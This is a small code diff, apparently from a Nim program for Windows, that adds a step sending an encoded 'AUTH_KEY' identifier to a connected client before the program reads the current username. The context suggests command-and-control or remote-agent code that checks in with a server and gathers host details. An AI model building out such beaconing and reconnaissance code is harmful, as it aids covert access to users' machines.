@@ -30,7 +30,11 @@ proc inbound_comm(): string =
   #var decoded_msg = decode(receivedMessage)
   return receivedMessage
   
-  
+
+var identifier = "AUTH_KEY" 
+client.send(encode(identifier)) 
+os.sleep(3000)
+
 var buffer = newString(UNLEN + 1)
 var cb = DWORD buffer.len
 GetUserNameA(&buffer, &cb)
